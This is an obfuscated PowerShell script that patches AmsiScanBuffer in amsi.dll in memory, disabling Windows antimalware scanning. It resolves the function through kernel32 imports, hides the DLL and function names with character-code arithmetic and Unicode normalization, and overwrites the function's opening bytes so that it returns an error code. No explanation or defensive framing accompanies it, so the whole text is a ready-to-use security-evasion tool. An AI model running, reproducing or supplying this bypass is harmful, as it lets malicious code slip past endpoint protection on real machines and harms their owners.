$PL8cgK = @"
using System;
using System.Runtime.InteropServices;
public class PL8cgK {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr tCe4uq5qe55AO, string _WAUc2Xv5_VH0RjAY4m);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Dn5FV20KKH0apFJq3Gn, UIntPtr mJQzNDZncQa, uint DTmiy_jbJyJO2FmX7C, out uint d_ag);
}
"@

Add-Type $PL8cgK

$A2f23kq = [PL8cgK]::LoadLibrary("$([cHAr]([bYte]0x61)+[ChAr]([ByTe]0x6d)+[char]([bYTe]0x73)+[CHAr](13+92)+[cHAR]([BytE]0x2e)+[cHaR]([bytE]0x64)+[chAr]([BYTe]0x6c)+[CHAR](108*8/8))")
$vH7 = [PL8cgK]::GetProcAddress($A2f23kq, "$(('ÄmsîScãnB'+'ùffèr').NOrmAlIZE([CHaR](8+62)+[ChaR]([BYTE]0x6f)+[CHar](58+56)+[CHAr]([BYte]0x6d)+[cHAR](68)) -replace [CHAr](92)+[char](112)+[chAr](123)+[CHAR](77*56/56)+[cHaR]([BYtE]0x6e)+[ChAr]([byTe]0x7d))")
$p = 0
[PL8cgK]::VirtualProtect($vH7, [uint32]5, 0x40, [ref]$p)
$VkUtM9W = "0xB8"
$XbPSiHL = "0x57"
$C9vMz = "0x00"
$fAsjJEKa = "0x07"
$zy2OgB6g1vB = "0x80"
$H9KyFCbD = "0xC3"
$mdf = [Byte[]] ($VkUtM9W,$XbPSiHL,$C9vMz,$fAsjJEKa,+$zy2OgB6g1vB,+$H9KyFCbD)
[System.Runtime.InteropServices.Marshal]::Copy($mdf, 0, $vH7, 6)